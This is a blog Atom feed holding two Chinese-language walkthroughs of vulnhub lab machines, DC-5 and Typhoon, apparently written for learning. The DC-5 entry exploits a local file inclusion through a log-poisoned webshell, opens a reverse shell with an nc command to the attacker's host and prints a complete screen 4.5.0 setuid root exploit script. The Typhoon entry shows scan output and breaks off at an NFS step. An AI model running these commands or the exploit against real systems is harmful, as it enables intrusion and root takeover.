<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>prontosil</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://prontosil.club/"/>
  <updated>2019-08-09T09:14:08.682Z</updated>
  <id>https://prontosil.club/</id>
  
  <author>
    <name>百浪多息</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DC靶机渗透</title>
    <link href="https://prontosil.club/2019/08/09/DC%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>https://prontosil.club/2019/08/09/DC靶机渗透/</id>
    <published>2019-08-09T08:12:11.000Z</published>
    <updated>2019-08-09T09:14:08.682Z</updated>
    
    <content type="html"><![CDATA[<h2 id="DC-5"><a href="#DC-5" class="headerlink" title="DC 5"></a>DC 5</h2><p>之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [4:06:38] </span><br><span class="line">$ arp-scan 192.168.41.0/24</span><br><span class="line">Interface: eth0, datalink type: EN10MB (Ethernet)</span><br><span class="line">Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.41.100:50:56:c0:00:08VMware, Inc.</span><br><span class="line">192.168.41.200:50:56:e0:f7:aaVMware, Inc.</span><br><span class="line">192.168.41.16600:0c:29:d7:ef:a4VMware, Inc.</span><br><span class="line">192.168.41.16700:0c:29:fd:e8:73VMware, Inc. ---&gt; DC5靶机</span><br><span class="line">192.168.41.25400:50:56:f5:fb:f6VMware, Inc.</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.5: 256 hosts scanned in 2.346 seconds (109.12 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure><p>masscan扫出了几个端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [4:09:46] </span><br><span class="line">$ masscan -p0-65535 192.168.41.167 --rate=1000000</span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 08:10:19 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65536 ports/host]</span><br><span class="line">Discovered open port 80/tcp on 192.168.41.167                                  </span><br><span class="line">Discovered open port 111/tcp on 192.168.41.167                                 </span><br><span class="line">Discovered open port 33188/tcp on 192.168.41.167</span><br></pre></td></tr></table></figure><p>然后上nmap扫服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [4:10:42] </span><br><span class="line">$ nmap -p80,111,33188 -sV -T4 192.168.41.167</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-09 04:15 EDT</span><br><span class="line">Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 66.67% done; ETC: 04:15 (0:00:06 remaining)</span><br><span class="line">Nmap scan report for 192.168.41.167</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    nginx 1.6.2</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">33188/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:FD:E8:73 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds</span><br></pre></td></tr></table></figure><p>访问原始网页：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5.png" alt=""></p><p><code>dirsearch.py</code>似乎没有发现什么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Target: http://192.168.41.167                                                                                           </span><br><span class="line">[16:24:35] Starting:</span><br><span class="line">[16:24:35] 400 -  172B  - /%2e%2e/google.com</span><br><span class="line">[16:24:42] 301 -  184B  - /css  -&gt;  http://192.168.41.167/css/</span><br><span class="line">[16:24:44] 301 -  184B  - /images  -&gt;  http://192.168.41.167/images/</span><br><span class="line">[16:24:44] 200 -    4KB - /index.php</span><br></pre></td></tr></table></figure><p>看了师傅们的提示，发现footer.php和有趣<br>每次刷新数字都会变化<br><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-0.png" alt=""></p><p>同时发现在 <code>http://192.168.41.167/thankyou.php</code>页面也有这种效果，于是猜想是不是本地文件包含漏洞</p><p>访问<code>http://192.168.41.167/thankyou.php?file=/etc/passwd</code>，页面回显了！</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-1.png" alt=""></p><p>同时该主机使用的是nginx服务，于是可以写一个shell到日志中并且包含这个文件</p><p>写入webshell，注意这里使用的是passthru函数</p><blockquote><p>同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。</p></blockquote><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-2.png" alt=""></p><p>kali监听一个端口然后访问如下路由去包含文件并且弹shell<br><code>http://192.168.41.167/thankyou.php?file=/var/log/nginx/access.log&amp;cmd=nc%20192.168.41.165%202333%20-c%20/bin/bash</code></p><p>核心命令<code>nc 192.168.41.165 -c /bin/bash</code></p><p>此时的权限是<code>www-data</code><br><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-3.png" alt=""></p><p>接下来看如何提权</p><p>上提权辅助脚本<br><a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" target="_blank" rel="noopener">链接</a><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">发现有这个文件</span><br><span class="line"></span><br><span class="line">![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/dc5-4.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exploit-db上搜一下啊exp：</span><br><span class="line"></span><br><span class="line">```sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"~ gnu/screenroot ~"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] First, we create our shell and library..."</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, 0, 0);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, 04755);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, NULL, NULL);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Now we create our /etc/ld.so.preload file..."</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">"\x0a/tmp/libhax.so"</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so... </span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure></p><h3 id="DC5后记"><a href="#DC5后记" class="headerlink" title="DC5后记"></a>DC5后记</h3><p>thankyou.php文件中有以下内容；典型的本地文件包含漏洞<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class="footer-wrapper"&gt;</span><br><span class="line">&lt;footer&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"$file"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"footer.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/footer&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;DC-5&quot;&gt;&lt;a href=&quot;#DC-5&quot; class=&quot;headerlink&quot; title=&quot;DC 5&quot;&gt;&lt;/a&gt;DC 5&lt;/h2&gt;&lt;p&gt;之前一直没能够确认靶机的ip地址，其实只需要将网络连接模式修改为NAT模式重启一下就行了&lt;/p&gt;
&lt;figure class
      
    
    </summary>
    
      <category term="vulstudy" scheme="https://prontosil.club/categories/vulstudy/"/>
    
    
      <category term="靶机" scheme="https://prontosil.club/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>typhoon靶机渗透</title>
    <link href="https://prontosil.club/2019/08/09/typhoon%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>https://prontosil.club/2019/08/09/typhoon靶机渗透/</id>
    <published>2019-08-08T23:30:37.000Z</published>
    <updated>2019-08-09T09:14:10.209Z</updated>
    
    <content type="html"><![CDATA[<p>昨天晚上实战了一把，遇到了很多师傅，也积累了一些刷靶机的经验，虽然Windows那台靶机不知道是怎么回事，但是Linux那台还是玩的比较爽的。</p><p>今天又重新从<a href="https://vulnhub.com上把靶机搞下来装到Vmware上自己实验" target="_blank" rel="noopener">https://vulnhub.com上把靶机搞下来装到Vmware上自己实验</a></p><p>靶机渗透之前也玩过，但是我每次发现自己都无法找到靶机的ip地址，这次重新实验了一下可以使用<code>arp-scan</code>和<code>masscan</code>工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [3:04:28] C:1</span><br><span class="line">$ arp-scan 192.168.41.0/24</span><br><span class="line">Interface: eth0, datalink type: EN10MB (Ethernet)</span><br><span class="line">Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.41.100:50:56:c0:00:08VMware, Inc.</span><br><span class="line">192.168.41.200:50:56:e0:f7:aaVMware, Inc.</span><br><span class="line">192.168.41.16600:0c:29:d7:ef:a4VMware, Inc.</span><br><span class="line">192.168.41.25400:50:56:f5:fb:f6VMware, Inc.</span><br><span class="line"></span><br><span class="line">62 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.5: 256 hosts scanned in 7.212 seconds (35.50 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure><p>前两个是类似网关的，第四个是kali的ip，中间第三个就是靶机的ip地址</p><p>用<code>masscan</code>也可以发现,同时端口也可以扫出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># root @ kali in ~ [3:04:28] C:1</span><br><span class="line">$ masscan -p0-65535 192.168.41.0/24 --rate=1000000</span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-09 07:05:04 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 256 hosts [65536 ports/host]</span><br><span class="line">Discovered open port 631/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 139/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 80/tcp on 192.168.41.166                                  </span><br><span class="line">Discovered open port 22/tcp on 192.168.41.166                                  </span><br><span class="line">Discovered open port 5432/tcp on 192.168.41.166                                </span><br><span class="line">Discovered open port 995/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 110/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 445/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 3306/tcp on 192.168.41.166                                </span><br><span class="line">Discovered open port 27017/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 44337/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 6379/tcp on 192.168.41.166                                </span><br><span class="line">Discovered open port 53/tcp on 192.168.41.2                                    </span><br><span class="line">Discovered open port 25/tcp on 192.168.41.166                                  </span><br><span class="line">Discovered open port 40811/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 33070/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 993/tcp on 192.168.41.166                                 </span><br><span class="line">Discovered open port 43074/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 21/tcp on 192.168.41.166                                  </span><br><span class="line">Discovered open port 53/tcp on 192.168.41.166                                  </span><br><span class="line">Discovered open port 2049/tcp on 192.168.41.166                                </span><br><span class="line">Discovered open port 37535/tcp on 192.168.41.166                               </span><br><span class="line">Discovered open port 8080/tcp on 192.168.41.166                                </span><br><span class="line">Discovered open port 143/tcp on 192.168.41.166</span><br></pre></td></tr></table></figure><p>nmap扫描最常用命令<code>nmap -sV -A -p- ip</code>可以扫描到靶机开放的端口和服务，当然那台靶机开放了好多好多个端口，需要记住一些常用的端口和它们对应的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.110.164</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">Not shown: 985 filtered ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">21/tcp   open  ftp         vsftpd 3.0.2</span><br><span class="line">|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_ftp-bounce: bounce working!</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to 192.168.110.72</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.2 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 02:df:b3:1b:01:dc:5e:fd:f9:96:d7:5b:b7:d6:7b:f9 (DSA)</span><br><span class="line">|   2048 de:af:76:27:90:2a:8f:cf:0b:2f:22:f8:42:36:07:dd (RSA)</span><br><span class="line">|   256 70:ae:36:6c:42:7d:ed:1b:c0:40:fc:2d:00:8d:87:11 (ECDSA)</span><br><span class="line">|_  256 bb:ce:f2:98:64:f7:8f:ae:f0:dd:3c:23:3b:a6:0f:61 (ED25519)</span><br><span class="line">25/tcp   open  smtp?</span><br><span class="line">|_smtp-commands: typhoon, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, </span><br><span class="line">53/tcp   open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.9.5-3-Ubuntu</span><br><span class="line">80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/mongoadmin/</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Typhoon Vulnerable VM by PRISMA CSI</span><br><span class="line">110/tcp  open  pop3        Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: PIPELINING TOP AUTH-RESP-CODE STLS SASL CAPA UIDL RESP-CODES</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100003  2,3,4       2049/tcp  nfs</span><br><span class="line">|   100003  2,3,4       2049/udp  nfs</span><br><span class="line">|   100005  1,2,3      43523/tcp  mountd</span><br><span class="line">|   100005  1,2,3      58512/udp  mountd</span><br><span class="line">|   100021  1,3,4      39728/udp  nlockmgr</span><br><span class="line">|   100021  1,3,4      59010/tcp  nlockmgr</span><br><span class="line">|   100024  1          39860/udp  status</span><br><span class="line">|   100024  1          57414/tcp  status</span><br><span class="line">|   100227  2,3         2049/tcp  nfs_acl</span><br><span class="line">|_  100227  2,3         2049/udp  nfs_acl</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp  open  imap        Dovecot imapd (Ubuntu)</span><br><span class="line">|_imap-capabilities: OK more Pre-login have post-login listed capabilities IMAP4rev1 LOGINDISABLEDA0001 ID IDLE STARTTLS ENABLE LITERAL+ SASL-IR LOGIN-REFERRALS</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">993/tcp  open  ssl/imaps?</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">995/tcp  open  ssl/pop3s?</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">2049/tcp open  nfs_acl     2-3 (RPC #100227)</span><br><span class="line">3306/tcp open  mysql?</span><br><span class="line">|_mysql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS</span><br><span class="line">|_  Potentially risky methods: PUT DELETE</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-server-header: Apache-Coyote/1.1</span><br><span class="line">|_http-title: Apache Tomcat</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: WAP</span><br><span class="line">Running: Actiontec embedded, Linux</span><br><span class="line">OS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel</span><br><span class="line">OS details: Actiontec MI424WR-GEN3I WAP</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">TCP Sequence Prediction: Difficulty=262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: Incremental</span><br><span class="line">Service Info: Host: TYPHOON; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><p>同时还有一个扫描结果：以前似乎没有看到过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 6h59m59s, deviation: 1h43m54s, median: 7h59m58s</span><br><span class="line">| nbstat: NetBIOS name: TYPHOON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| Names:</span><br><span class="line">|   TYPHOON&lt;00&gt;          Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   TYPHOON&lt;03&gt;          Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   TYPHOON&lt;20&gt;          Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Unix (Samba 4.1.6-Ubuntu)</span><br><span class="line">|   Computer name: typhoon</span><br><span class="line">|   NetBIOS computer name: TYPHOON\x00</span><br><span class="line">|   Domain name: local</span><br><span class="line">|   FQDN: typhoon.local</span><br><span class="line">|_  System time: 2019-08-09T11:30:49+03:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2019-08-09 04:30:48</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.04 ms 192.168.41.2</span><br><span class="line">2   0.17 ms 192.168.110.164</span><br></pre></td></tr></table></figure><p>我最先打的是2049端口，因为这个端口对应的是nfs服务，用这条命令：<br><code>nmap -sV --script=nfs-showmount  ip</code>扫出可以远程挂载的目录</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/aaaaaaa.png" 